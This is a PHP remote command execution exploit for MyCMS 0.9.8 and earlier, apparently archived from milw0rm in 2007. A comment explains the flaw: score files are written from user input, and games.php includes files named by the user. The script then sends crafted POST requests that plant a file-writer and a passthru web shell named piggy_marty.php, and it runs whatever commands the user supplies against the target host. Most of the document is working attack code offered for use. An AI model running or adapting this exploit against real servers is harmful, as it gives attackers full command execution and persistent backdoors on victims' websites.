#!/usr/bin/php -q -d short_open_tag=on
<?
echo "
MyCMS <= 0.9.8 Remote Command Execution Exploit (2 method)
by BlackHawk <hawkgotyou@gmail.com> <http://itablackhawk.altervista.org>
Thanks to rgod for the php code and Marty for the Love

";
if ($argc<3) {
echo "Usage: php ".$argv[0]." Host Path CMD
Host:          target server (ip/hostname)
Path:          path of myblog

Example:
php ".$argv[0]." localhost /myblog/ dir";

die;
}
/*
VULN:

The problem is located in all files that manages hight-scores of the game, such
as snakep.php or tetrisp.php

Code:

<?php

if (empty($_COOKIE['login'])) {
echo "No Score was set because you are not logged in!";
exit;
}

else {
$data = file_get_contents("snake_score.txt");

$score = $_POST['score'];
$by = $_COOKIE['login'];

if ($score < $data) {
echo "<br />No new score set<br />";
}

elseif ($score > $data) {
$file1 = "snake_score.txt";
$file2 = "snake_setby.txt";
$file1h = fopen($file1, 'w') or die("can't open file");
$file2h = fopen($file2, 'w') or die("can't open file");
fwrite($file1h, $score);
fclose($file1h);

fwrite($file2h, $by);
fclose($file2h);
echo "<br />A new Top Score has been Set!!!!<br />";
}

ok, we can put our code into a txt file, but then?
look at this (games.php):

if (isset($_GET['scoreid'])) {
echo "Top Score for this game: ";
include($_GET['scoreid'] . "_score.txt");
echo ", Set By:";
include($_GET['scoreid'] . "_setby.txt");
}

setting properly our scoreid var we can perform an include..
This exploit create a piggy_marty.php shell on the victim site


PS: into games.php you can also find this:

if ($_GET['id'] == snake) {
include("snake.html");
}
else {
include($_GET['id'] . ".php");
}

but it might be usefull only if mq=off..

have a nice summer..
*/

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}

$host=$argv[1];
$path=$argv[2];
$cmd="";
for ($i=3; $i<=$argc-1; $i++){
$cmd.=" ".$argv[$i];
}
$cmd=urlencode($cmd);


$port=80;
$proxy="";

if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

echo "Step0 - See If piggy_marty.php already exists..\r\n";
$packet="GET ".$p."piggy_marty.php?cmd=$cmd HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Cookie: cmd=$cmd\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);
if (strstr($html,"666999"))
{
  echo "Exploit succeeded...\r\n";
  $temp=explode("666999",$html);
  die("\r\n".$temp[1]."\r\n");
}

echo "Step1 - Sending 'score'..\r\n";
$shell_c='<?php
$fp=fopen($_GET[name],$_GET[type]);
fputs($fp,stripslashes($_POST[shell]));
fclose($fp);
chmod($_GET[name],777);
?>';
$data="score=$shell_c";
$packet="POST ".$p."snakep.php HTTP/1.0\r\n";
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, * /*\r\n";
$packet.="Accept-Language: it\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Accept-Encoding: gzip, deflate\r\n";
$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Cookie: login=BlackHawk\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: Close\r\n";
$packet.="Cache-Control: no-cache\r\n\r\n";
$packet.=$data;
sendpacketii($packet);

echo "Step2 - Making the shell..\r\n";
// You can edit this with your favourite shell
$shell='<?php error_reporting(0);
set_time_limit(0);
if (get_magic_quotes_gpc()) {
$_GET[cmd]=stripslashes($_GET[cmd]);
}
echo 666999;
passthru($_GET[cmd]);
echo 666999;
?>';

$data="shell=$shell";
$packet="POST ".$p."games.php?id=snake&scoreid=snake&name=piggy_marty.php&type=w HTTP/1.0\r\n";
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, * /*\r\n";
$packet.="Accept-Language: it\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Accept-Encoding: gzip, deflate\r\n";
$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Cookie: login=BlackHawk\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: Close\r\n";
$packet.="Cache-Control: no-cache\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
sleep(3);

echo "Step3 - Executing Shell..\r\n";
$packet="GET ".$p."piggy_marty.php?cmd=$cmd HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Cookie: cmd=$cmd\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);
if (strstr($html,"666999"))
{
  echo "Exploit succeeded...\r\n";
  $temp=explode("666999",$html);
  die("\r\n".$temp[1]."\r\n");
}

# Coded With BH Fast Generator v0.1
?>

# milw0rm.com [2007-07-03]
